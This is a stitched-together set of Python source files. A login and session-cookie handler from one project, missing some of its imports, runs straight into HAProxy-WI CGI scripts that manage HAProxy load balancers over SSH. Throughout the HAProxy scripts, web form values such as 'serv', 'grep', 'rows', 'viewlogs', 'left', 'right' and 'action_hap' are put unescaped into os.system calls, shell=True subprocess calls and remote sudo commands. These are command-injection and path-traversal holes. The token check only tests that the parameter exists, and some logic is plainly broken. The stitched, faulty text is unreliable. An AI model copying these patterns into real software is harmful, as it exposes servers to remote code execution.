from handlers import base_handler
from libs import auth
from libs import handler
from libs import helpers
from metrics import logs

SESSION_EXPIRY_DAYS = 14


class Handler(base_handler.Handler):
  """Login page."""

  @handler.unsupported_on_local_server
  @handler.get(handler.HTML)
  def get(self):
    """Handle a get request."""
    self.render(
        'login.html', {
            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),
            'authDomain': auth.auth_domain(),
            'dest': self.request.get('dest'),                    
        })


class SessionLoginHandler(base_handler.Handler):
  """Session login handler."""

  @handler.post(handler.JSON, handler.JSON)
  def post(self):
    """Handle a post request."""
    id_token = self.request.get('idToken')
    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)
    try:
      session_cookie = auth.create_session_cookie(id_token, expires_in)
    except auth.AuthError:
      raise helpers.EarlyExitException('Failed to create session cookie.', 401)

    expires = datetime.datetime.now() + expires_in
    self.response.set_cookie(
        'session',
        session_cookie,
        expires=expires,
        httponly=True,
        secure=True,
        overwrite=True)
    self.render_json({'status': 'success'})


class LogoutHandler(base_handler.Handler):
  """Log out handler."""

  @handler.unsupported_on_local_server
  @handler.require_csrf_token
  @handler.get(handler.HTML)
  def get(self):
    """Handle a get request."""
    try:
      auth.revoke_session_cookie(auth.get_session_cookie())
    except auth.AuthError:
      # Even if the revoke failed, remove the cookie.
      logs.log_error('Failed to revoke session cookie.')

    self.response.delete_cookie('session')
    self.redirect(self.request.get('dest'))

#!/usr/bin/env python3
import cgi
import os
import http.cookies
import funct
import sql
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader('templates/'))                    
template = env.get_template('config.html')

print('Content-type: text/html\n')
funct.check_login()

form = cgi.FieldStorage()
serv = form.getvalue('serv')
config_read = ""
cfg = ""
stderr = ""
error = ""
aftersave = ""

try:
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_id = cookie.get('uuid')
	user = sql.get_user_name_by_uuid(user_id.value)
	servers = sql.get_dick_permit()
	token = sql.get_token(user_id.value)
	role = sql.get_user_role_by_uuid(user_id.value)
except:
	pass

hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')

if serv is not None:
	cfg = hap_configs_dir + serv + "-" + funct.get_data('config') + ".cfg"

if serv is not None and form.getvalue('open') is not None :
	
	try:
		funct.logging(serv, "config.py open config")
	except:
		pass
	
	error = funct.get_config(serv, cfg)
	
	try:
		conf = open(cfg, "r")
		config_read = conf.read()
		conf.close
	except IOError:
		error += '<br />Can\'t read import config file'

	os.system("/bin/mv %s %s.old" % (cfg, cfg))	

if serv is not None and form.getvalue('config') is not None:
	try:
		funct.logging(serv, "config.py edited config")
	except:
		pass
		
	config = form.getvalue('config')
	oldcfg = form.getvalue('oldconfig')
	save = form.getvalue('save')
	aftersave = 1
	try:
		with open(cfg, "a") as conf:
			conf.write(config)
	except IOError:
		error = "Can't read import config file"
	
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload_and_restart(master[0], cfg, just_save=save)
		
	stderr = funct.upload_and_restart(serv, cfg, just_save=save)
		
	funct.diff_config(oldcfg, cfg)
	
	#if save:
	#	c = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	#	c["restart"] = form.getvalue('serv')
	#	print(c)
		
	os.system("/bin/rm -f " + hap_configs_dir + "*.old")


template = template.render(h2 = 1, title = "Working with HAProxy configs",
							role = role,
							action = "config.py",
							user = user,
							select_id = "serv",
							serv = serv,
							aftersave = aftersave,
							config = config_read,
							cfg = cfg,
							selects = servers,
							stderr = stderr,
							error = error,
							note = 1,
							token = token)
print(template)

# -*- coding: utf-8 -*-"
import cgi
import os, sys

form = cgi.FieldStorage()
serv = form.getvalue('serv')

def get_app_dir():
	d = sys.path[0]
	d = d.split('/')[-1]		
	return sys.path[0] if d == "app" else os.path.dirname(sys.path[0])	

def get_config_var(sec, var):
	from configparser import ConfigParser, ExtendedInterpolation
	try:
		path_config = get_app_dir()+"/haproxy-wi.cfg"
		config = ConfigParser(interpolation=ExtendedInterpolation())
		config.read(path_config)
	except:
		print('Content-type: text/html\n')
		print('<center><div class="alert alert-danger">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')
	try:
		return config.get(sec, var)
	except:
		print('Content-type: text/html\n')
		print('<center><div class="alert alert-danger">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))
					
def get_data(type):
	from datetime import datetime
	from pytz import timezone
	import sql
	now_utc = datetime.now(timezone(sql.get_setting('time_zone')))
	if type == 'config':
		fmt = "%Y-%m-%d.%H:%M:%S"
	if type == 'logs':
		fmt = '%Y%m%d'
	if type == "date_in_log":
		fmt = "%b %d %H:%M:%S"
		
	return now_utc.strftime(fmt)
			
def logging(serv, action, **kwargs):
	import sql
	import http.cookies
	log_path = get_config_var('main', 'log_path')
	login = ''
	
	if not os.path.exists(log_path):
		os.makedirs(log_path)
		
	try:
		IP = cgi.escape(os.environ["REMOTE_ADDR"])
		cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
		user_uuid = cookie.get('uuid')
		login = sql.get_user_name_by_uuid(user_uuid.value)
	except:
		pass
		
	if kwargs.get('alerting') == 1:
		mess = get_data('date_in_log') + action + "\n"
		log = open(log_path + "/checker-"+get_data('logs')+".log", "a")
	elif kwargs.get('metrics') == 1:
		mess = get_data('date_in_log') + action + "\n"
		log = open(log_path + "/metrics-"+get_data('logs')+".log", "a")
	elif kwargs.get('keep_alive') == 1:
		mess = get_data('date_in_log') + action + "\n"
		log = open(log_path + "/keep_alive-"+get_data('logs')+".log", "a")
	else:
		mess = get_data('date_in_log') + " from " + IP + " user: " + login + " " + action + " for: " + serv + "\n"
		log = open(log_path + "/config_edit-"+get_data('logs')+".log", "a")
	try:	
		log.write(mess)
		log.close
	except IOError as e:
		print('<center><div class="alert alert-danger">Can\'t write log. Please check log_path in config %e</div></center>' % e)
		pass
	
def telegram_send_mess(mess, **kwargs):
	import telebot
	from telebot import apihelper
	import sql
	
	telegrams = sql.get_telegram_by_ip(kwargs.get('ip'))
	proxy = sql.get_setting('proxy')
	
	for telegram in telegrams:
		token_bot = telegram[1]
		channel_name = telegram[2]
			
	if proxy is not None:
		apihelper.proxy = {'https': proxy}
	try:
		bot = telebot.TeleBot(token=token_bot)
		bot.send_message(chat_id=channel_name, text=mess)
	except:
		print("Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group")
		sys.exit()
	
def check_login(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_uuid = cookie.get('uuid')
	ref = os.environ.get("SCRIPT_NAME")

	sql.delete_old_uuid()
	
	if user_uuid is not None:
		sql.update_last_act_user(user_uuid.value)
		if sql.get_user_name_by_uuid(user_uuid.value) is None:
			print('<meta http-equiv="refresh" content="0; url=login.py?ref=%s">' % ref)
	else:
		print('<meta http-equiv="refresh" content="0; url=login.py?ref=%s">' % ref)
				
def is_admin(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_id = cookie.get('uuid')
	try:
		role = sql.get_user_role_by_uuid(user_id.value)
	except:
		role = 3
		pass
	level = kwargs.get("level")
		
	if level is None:
		level = 1
		
	try:
		return True if role <= level else False
	except:
		return False
		pass

def page_for_admin(**kwargs):
	give_level = 1
	give_level = kwargs.get("level")
		
	if not is_admin(level = give_level):                    
		print('<center><h3 style="color: red">How did you get here?! O_o You do not have need permissions</h>')
		print('<meta http-equiv="refresh" content="5; url=/">')
		import sys
		sys.exit()
				
def ssh_connect(serv, **kwargs):
	import paramiko
	from paramiko import SSHClient
	import sql
	fullpath = get_config_var('main', 'fullpath')
	ssh_enable = ''
	ssh_port = ''
	ssh_user_name = ''
	ssh_user_password = ''
	
	for sshs in sql.select_ssh(serv=serv):
		ssh_enable = sshs[3]
		ssh_user_name = sshs[4]
		ssh_user_password = sshs[5]
		ssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]

	servers = sql.select_servers(server=serv)
	for server in servers:
		ssh_port = server[10]

	ssh = SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		if ssh_enable == 1:
			k = paramiko.RSAKey.from_private_key_file(ssh_key_name)
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)
		else:
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)
		return ssh
	except paramiko.AuthenticationException:
		return 'Authentication failed, please verify your credentials'
		pass
	except paramiko.SSHException as sshException:
		return 'Unable to establish SSH connection: %s ' % sshException
		pass
	except paramiko.BadHostKeyException as badHostKeyException:
		return 'Unable to verify server\'s host key: %s ' % badHostKeyException
		pass
	except Exception as e:
		if e == "No such file or directory":
			return '%s. Check ssh key' % e
			pass
		elif e == "Invalid argument":
			error = 'Check the IP of the server'
			pass
		else:
			error = e	
			pass
		return str(error)

def get_config(serv, cfg, **kwargs):
	import sql

	config_path = "/etc/keepalived/keepalived.conf" if kwargs.get("keepalived") else sql.get_setting('haproxy_config_path')	
	ssh = ssh_connect(serv)
	try:
		sftp = ssh.open_sftp()
		sftp.get(config_path, cfg)
		sftp.close()
		ssh.close()
	except Exception as e:
		ssh = str(e)
		return ssh
	
def diff_config(oldcfg, cfg):
	log_path = get_config_var('main', 'log_path')
	diff = ""
	date = get_data('date_in_log') 
	cmd="/bin/diff -ub %s %s" % (oldcfg, cfg)
	
	output, stderr = subprocess_execute(cmd)
	
	for line in output:
		diff += date + " " + line + "\n"
	try:		
		log = open(log_path + "/config_edit-"+get_data('logs')+".log", "a")
		log.write(diff)
		log.close
	except IOError:
		print('<center><div class="alert alert-danger">Can\'t read write change to log. %s</div></center>' % stderr)
		pass
		
def install_haproxy(serv, **kwargs):
	import sql
	script = "install_haproxy.sh"
	tmp_config_path = sql.get_setting('tmp_config_path')
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	stats_port = sql.get_setting('stats_port')
	server_state_file = sql.get_setting('server_state_file')
	stats_user = sql.get_setting('stats_user')
	stats_password = sql.get_setting('stats_password')
	proxy = sql.get_setting('proxy')
	os.system("cp scripts/%s ." % script)
	
	proxy_serv = proxy if proxy is not None else ""
		
	commands = [ "sudo chmod +x "+tmp_config_path+script+" && " +tmp_config_path+"/"+script +" PROXY=" + proxy_serv+ 
				" SOCK_PORT="+haproxy_sock_port+" STAT_PORT="+stats_port+" STAT_FILE="+server_state_file+
				" STATS_USER="+stats_user+" STATS_PASS="+stats_password ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
		
	os.system("rm -f %s" % script)
	ssh_command(serv, commands, print_out="1")
	
	if kwargs.get('syn_flood') == "1":
		syn_flood_protect(serv)
	
def syn_flood_protect(serv, **kwargs):
	import sql
	script = "syn_flood_protect.sh"
	tmp_config_path = sql.get_setting('tmp_config_path')
	
	enable = "disable" if kwargs.get('enable') == "0" else "disable"

	os.system("cp scripts/%s ." % script)
	
	commands = [ "sudo chmod +x "+tmp_config_path+script, tmp_config_path+script+ " "+enable ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system("rm -f %s" % script)
	ssh_command(serv, commands, print_out="1")
	
def waf_install(serv, **kwargs):
	import sql
	script = "waf.sh"
	tmp_config_path = sql.get_setting('tmp_config_path')
	proxy = sql.get_setting('proxy')
	haproxy_dir = sql.get_setting('haproxy_dir')
	ver = check_haproxy_version(serv)

	os.system("cp scripts/%s ." % script)
	
	commands = [ "sudo chmod +x "+tmp_config_path+script+" && " +tmp_config_path+script +" PROXY=" + proxy+ 
				" HAPROXY_PATH="+haproxy_dir +" VERSION="+ver ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system("rm -f %s" % script)
	
	stderr = ssh_command(serv, commands, print_out="1")
	if stderr is None:
		sql.insert_waf_metrics_enable(serv, "0")

def check_haproxy_version(serv):
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	ver = ""
	cmd="echo 'show info' |nc %s %s |grep Version |awk '{print $2}'" % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	for line in output:
		ver = line
	return ver
	
def upload(serv, path, file, **kwargs):
	error = ""
	full_path = path + file

	if kwargs.get('dir') == "fullpath":
		full_path = path
	
	try:
		ssh = ssh_connect(serv)
	except Exception as e:
		error = e
		pass
	try:
		sftp = ssh.open_sftp()
		file = sftp.put(file, full_path)
		sftp.close()
		ssh.close()
	except Exception as e:
		error = e
		pass
		
	return error
	
def upload_and_restart(serv, cfg, **kwargs):
	import sql
	tmp_file = sql.get_setting('tmp_config_path') + "/" + get_data('config') + ".cfg"
	error = ""
	
	try:
		os.system("dos2unix "+cfg)
	except OSError:
		return 'Please install dos2unix' 
		pass
	
	if kwargs.get("keepalived") == 1:
		if kwargs.get("just_save") == "save":
			commands = [ "sudo mv -f " + tmp_file + " /etc/keepalived/keepalived.conf" ]
		else:
			commands = [ "sudo mv -f " + tmp_file + " /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived" ]
	else:
		if kwargs.get("just_save") == "test":
			commands = [ "sudo haproxy  -q -c -f " + tmp_file + "&& sudo rm -f " + tmp_file ]
		elif kwargs.get("just_save") == "save":
			commands = [ "sudo haproxy  -q -c -f " + tmp_file + "&& sudo mv -f " + tmp_file + " " + sql.get_setting('haproxy_config_path') ]
		else:
			commands = [ "sudo haproxy  -q -c -f " + tmp_file + "&& sudo mv -f " + tmp_file + " " + sql.get_setting('haproxy_config_path') + " && sudo " + sql.get_setting('restart_command') ]	
		if sql.get_setting('firewall_enable') == "1":
			commands.extend(open_port_firewalld(cfg))
	
	error += str(upload(serv, tmp_file, cfg, dir='fullpath'))

	try:
		error += ssh_command(serv, commands)
	except Exception as e:
		error += e
	if error:
		return error
		
def open_port_firewalld(cfg):
	try:
		conf = open(cfg, "r")
	except IOError:
		print('<div class="alert alert-danger">Can\'t read export config file</div>')
	
	firewalld_commands = []
	
	for line in conf:
		if "bind" in line:
			bind = line.split(":")
			bind[1] = bind[1].strip(' ')
			bind = bind[1].split("ssl")
			bind = bind[0].strip(' \t\n\r')
			firewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)
				
	firewalld_commands.append('sudo firewall-cmd --reload')
	return firewalld_commands
	
def check_haproxy_config(serv):
	import sql
	commands = [ "haproxy  -q -c -f %s" % sql.get_setting('haproxy_config_path') ]
	ssh = ssh_connect(serv)
	for command in commands:
		stdin , stdout, stderr = ssh.exec_command(command, get_pty=True)
		if not stderr.read():
			return True
		else:
			return False
	ssh.close()
		
def show_log(stdout):
	i = 0
	for line in stdout:
		i = i + 1
		line_class = "line3" if i % 2 == 0 else "line"
		print('<div class="'+line_class+'">' + escape_html(line) + '</div>')
			
def show_ip(stdout):
	for line in stdout:
		print(line)
		
def server_status(stdout):	
	proc_count = ""
	
	for line in stdout:
		if "Ncat: " not in line:
			for k in line:
				proc_count = k.split(":")[1]
		else:
			proc_count = 0
	return proc_count		

def ssh_command(serv, commands, **kwargs):
	ssh = ssh_connect(serv)
		  
	for command in commands:
		try:
			stdin, stdout, stderr = ssh.exec_command(command, get_pty=True)
		except:
			continue
				
		if kwargs.get("ip") == "1":
			show_ip(stdout)
		elif kwargs.get("show_log") == "1":
			show_log(stdout)
		elif kwargs.get("server_status") == "1":
			server_status(stdout)
		elif kwargs.get('print_out'):
			print(stdout.read().decode(encoding='UTF-8'))
			return stdout.read().decode(encoding='UTF-8')
		elif kwargs.get('retunr_err') == 1:
			return stderr.read().decode(encoding='UTF-8')
		else:
			return stdout.read().decode(encoding='UTF-8')
			
		for line in stderr.read().decode(encoding='UTF-8'):
			if line:
				print("<div class='alert alert-warning'>"+line+"</div>")
	try:	
		ssh.close()
	except:
		print("<div class='alert alert-danger' style='margin: 0;'>"+str(ssh)+"<a title='Close' id='errorMess'><b>X</b></a></div>")
		pass

def escape_html(text):
	return cgi.escape(text, quote=True)
	
def subprocess_execute(cmd):
	import subprocess 
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
	stdout, stderr = p.communicate()
	output = stdout.splitlines()
	
	return output, stderr

def show_backends(serv, **kwargs):
	import json
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	cmd='echo "show backend" |nc %s %s' % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	ret = ""
	for line in output:
		if "#" in  line or "stats" in line:
			continue
		if line != "":
			back = json.dumps(line).split("\"")
			if kwargs.get('ret'):
				ret += back[1]
				ret += "<br />"
			else:
				print(back[1], end="<br>")
		
	if kwargs.get('ret'):
		return ret
		
def get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):
	import glob
	file = set()
	return_files = set()
	
	for files in glob.glob(os.path.join(dir,'*.'+format)):				
		file.add(files.split('/')[-1])
	files = sorted(file, reverse=True)

	if format == 'cfg':
		for file in files:
			ip = file.split("-")
			if serv == ip[0]:
				return_files.add(file)
		return sorted(return_files, reverse=True)
	else: 
		return files
	
def get_key(item):
	return item[0]

#!/usr/bin/env python3
# -*- coding: utf-8 -*-"
import cgi
import os, sys
import funct
import sql
import ovw

form = cgi.FieldStorage()
serv = form.getvalue('serv')
act = form.getvalue('act')
	
print('Content-type: text/html\n')

if act == "checkrestart":
	servers = sql.get_dick_permit(ip=serv)
	for server in servers:
		if server != "":
			print("ok")
			sys.exit()
	sys.exit()

if form.getvalue('token') is None:
	print("What the fuck?! U r hacker Oo?!")
	sys.exit()
		
if form.getvalue('getcerts') is not None and serv is not None:
	cert_path = sql.get_setting('cert_path')
	commands = [ "ls -1t "+cert_path+" |grep pem" ]
	try:
		funct.ssh_command(serv, commands, ip="1")
	except:
		print('<div class="alert alert-danger" style="margin:0">Can not connect to the server</div>')

if form.getvalue('checkSshConnect') is not None and serv is not None:
	try:
		funct.ssh_command(serv, ["ls -1t"])
	except:
		print('<div class="alert alert-danger" style="margin:0">Can not connect to the server</div>')
		
if form.getvalue('getcert') is not None and serv is not None:
	id = form.getvalue('getcert')
	cert_path = sql.get_setting('cert_path')
	commands = [ "cat "+cert_path+"/"+id ]
	try:
		funct.ssh_command(serv, commands, ip="1")
	except:
		print('<div class="alert alert-danger" style="margin:0">Can not connect to the server</div>')
		
if form.getvalue('ssh_cert'):
	name = form.getvalue('name')
	
	if not os.path.exists(os.getcwd()+'/keys/'):
		os.makedirs(os.getcwd()+'/keys/')
	
	ssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'
	
	try:
		with open(ssh_keys, "w") as conf:
			conf.write(form.getvalue('ssh_cert'))
	except IOError:
		print('<div class="alert alert-danger">Can\'t save ssh keys file. Check ssh keys path in config</div>')
	else:
		print('<div class="alert alert-success">Ssh key was save into: %s </div>' % ssh_keys)
	try:
		funct.logging("local", "users.py#ssh upload new ssh cert %s" % ssh_keys)
	except:
		pass
			
if serv and form.getvalue('ssl_cert'):
	cert_local_dir = funct.get_config_var('main', 'cert_local_dir')
	cert_path = sql.get_setting('cert_path')
	
	if not os.path.exists(cert_local_dir):
		os.makedirs(cert_local_dir)
	
	if form.getvalue('ssl_name') is None:
		print('<div class="alert alert-danger">Please enter desired name</div>')
	else:
		name = form.getvalue('ssl_name') + '.pem'
	
	try:
		with open(name, "w") as ssl_cert:
			ssl_cert.write(form.getvalue('ssl_cert'))
	except IOError:
		print('<div class="alert alert-danger">Can\'t save ssl keys file. Check ssh keys path in config</div>')
	else:
		print('<div class="alert alert-success">SSL file was upload to %s into: %s </div>' % (serv, cert_path))
		
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload(master[0], cert_path, name)
	try:
		funct.upload(serv, cert_path, name)
	except:
		pass
	
	os.system("mv %s %s" % (name, cert_local_dir))
	funct.logging(serv, "add.py#ssl upload new ssl cert %s" % name)
	
if form.getvalue('backend') is not None:
	funct.show_backends(serv)
	
if form.getvalue('ip') is not None and serv is not None:
	commands = [ "sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'" ]
	funct.ssh_command(serv, commands, ip="1")
	
if form.getvalue('showif'):
	commands = ["sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'"]
	funct.ssh_command(serv, commands, ip="1")
	
if form.getvalue('action_hap') is not None and serv is not None:
	action = form.getvalue('action_hap')
	
	if funct.check_haproxy_config(serv):
		commands = [ "sudo systemctl %s haproxy" % action ]
		funct.ssh_command(serv, commands)		
		print("HAproxy was %s" % action)
	else:
		print("Bad config, check please")
	
if form.getvalue('action_waf') is not None and serv is not None:
	serv = form.getvalue('serv')
	action = form.getvalue('action_waf')

	commands = [ "sudo systemctl %s waf" % action ]
	funct.ssh_command(serv, commands)		
	
if act == "overview":
	ovw.get_overview()
	
if act == "overviewwaf":
	ovw.get_overviewWaf(form.getvalue('page'))
	
if act == "overviewServers":
	ovw.get_overviewServers()
	
if form.getvalue('action'):
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	
	postdata = {
		'action' : form.getvalue('action'),
		's' : form.getvalue('s'),
		'b' : form.getvalue('b')
	}

	headers = {
		'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',
		'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language' : 'en-US,en;q=0.5',
		'Accept-Encoding' : 'gzip, deflate'
	}

	q = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))
	
if serv is not None and act == "stats":
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	try:
		response = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) 
	except requests.exceptions.ConnectTimeout:
		print('Oops. Connection timeout occured!')
	except requests.exceptions.ReadTimeout:
		print('Oops. Read timeout occured')
	except requests.exceptions.HTTPError as errh:
		print ("Http Error:",errh)
	except requests.exceptions.ConnectionError as errc:
		print ('<div class="alert alert-danger">Error Connecting: %s</div>' % errc)
	except requests.exceptions.Timeout as errt:
		print ("Timeout Error:",errt)
	except requests.exceptions.RequestException as err:
		print ("OOps: Something Else",err)
		
	data = response.content
	print(data.decode('utf-8'))

if serv is not None and form.getvalue('rows') is not None:
	rows = form.getvalue('rows')
	waf = form.getvalue('waf')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
        	grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	syslog_server_enable = sql.get_setting('syslog_server_enable')
	if syslog_server_enable is None or syslog_server_enable == "0":
		local_path_logs = sql.get_setting('local_path_logs')
		syslog_server = serv	
		commands = [ "sudo cat %s| awk '$3>\"%s:00\" && $3<\"%s:00\"' |tail -%s  %s %s" % (local_path_logs, date, date1, rows, grep_act, grep) ]		
	else:
		commands = [ "sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s" % (serv, date, date1, rows, grep_act, grep) ]
		syslog_server = sql.get_setting('syslog_server')
	
	if waf == "1":
		local_path_logs = '/var/log/modsec_audit.log'
		commands = [ "sudo cat %s |tail -%s  %s %s" % (local_path_logs, rows, grep_act, grep) ]	
		
	funct.ssh_command(syslog_server, commands, show_log="1")
	
if serv is not None and form.getvalue('rows1') is not None:
	rows = form.getvalue('rows1')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	apache_log_path = sql.get_setting('apache_log_path')
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''
		
	if serv == 'haproxy-wi.access.log':
		cmd="cat %s| awk -F\"/|:\" '$3>\"%s:00\" && $3<\"%s:00\"' |tail -%s  %s %s" % (apache_log_path+"/"+serv, date, date1, rows, grep_act, grep)
	else:
		cmd="cat %s| awk '$4>\"%s:00\" && $4<\"%s:00\"' |tail -%s  %s %s" % (apache_log_path+"/"+serv, date, date1, rows, grep_act, grep)

	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if form.getvalue('viewlogs') is not None:
	viewlog = form.getvalue('viewlogs')
	log_path = funct.get_config_var('main', 'log_path')
	rows = form.getvalue('rows2')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	cmd="cat %s| awk '$3>\"%s:00\" && $3<\"%s:00\"' |tail -%s  %s %s" % (log_path + viewlog, date, date1, rows, grep_act, grep)
	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if serv is not None and act == "showMap":
	ovw.get_map(serv)
	
if form.getvalue('servaction') is not None:
	server_state_file = sql.get_setting('server_state_file')
	haproxy_sock = sql.get_setting('haproxy_sock')
	enable = form.getvalue('servaction')
	backend = form.getvalue('servbackend')	
	cmd='echo "%s %s" |sudo socat stdio %s | cut -d "," -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)
	
	if form.getvalue('save') == "on":
		save_command = 'echo "show servers state" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)
		command = [ cmd, save_command ] 
	else:
		command = [ cmd ] 
		
	if enable != "show":
		print('<center><h3>You %s %s on HAproxy %s. <a href="viewsttats.py?serv=%s" title="View stat" target="_blank">Look it</a> or <a href="edit.py" title="Edit">Edit something else</a></h3><br />' % (enable, backend, serv, serv))
			
	funct.ssh_command(serv, command, show_log="1")
	action = 'edit.py ' + enable + ' ' + backend
	funct.logging(serv, action)

if act == "showCompareConfigs":
	import glob
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'))                    
	template = env.get_template('/show_compare_configs.html')
	left = form.getvalue('left')
	right = form.getvalue('right')
	
	template = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())									
	print(template)
	
if serv is not None and form.getvalue('right') is not None:
	from jinja2 import Environment, FileSystemLoader
	left = form.getvalue('left')
	right = form.getvalue('right')
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	cmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)	
	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', "jinja2.ext.do"])
	template = env.get_template('compare.html')
	
	output, stderr = funct.subprocess_execute(cmd)
	template = template.render(stdout=output)	
	
	print(template)
	print(stderr)
	
if serv is not None and act == "configShow":
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	
	if form.getvalue('configver') is None:	
		cfg = hap_configs_dir + serv + "-" + funct.get_data('config') + ".cfg"
		funct.get_config(serv, cfg)
	else: 
		cfg = hap_configs_dir + form.getvalue('configver')
			
	try:
		conf = open(cfg, "r")
	except IOError:
		print('<div class="alert alert-danger">Can\'t read import config file</div>')
		
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])                    
	template = env.get_template('config_show.html')
	
	template = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))											
	print(template)
	
	if form.getvalue('configver') is None:
		os.system("/bin/rm -f " + cfg)	
		
if form.getvalue('master'):
	master = form.getvalue('master')
	slave = form.getvalue('slave')
	interface = form.getvalue('interface')
	vrrpip = form.getvalue('vrrpip')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = "install_keepalived.sh"
	
	if form.getvalue('hap') == "1":
		funct.install_haproxy(master)
		funct.install_haproxy(slave)
		
	if form.getvalue('syn_flood') == "1":
		funct.syn_flood_protect(master)
		funct.syn_flood_protect(slave)
	
	os.system("cp scripts/%s ." % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)

	funct.ssh_command(master, ["sudo chmod +x "+tmp_config_path+script, tmp_config_path+script+" MASTER "+interface+" "+vrrpip])
	funct.ssh_command(slave, ["sudo chmod +x "+tmp_config_path+script, tmp_config_path+script+" BACKUP "+interface+" "+vrrpip])
			
	os.system("rm -f %s" % script)
	sql.update_server_master(master, slave)
	
if form.getvalue('masteradd'):
	master = form.getvalue('masteradd')
	slave = form.getvalue('slaveadd')
	interface = form.getvalue('interfaceadd')
	vrrpip = form.getvalue('vrrpipadd')
	kp = form.getvalue('kp')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = "add_vrrp.sh"
	
	os.system("cp scripts/%s ." % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)
	
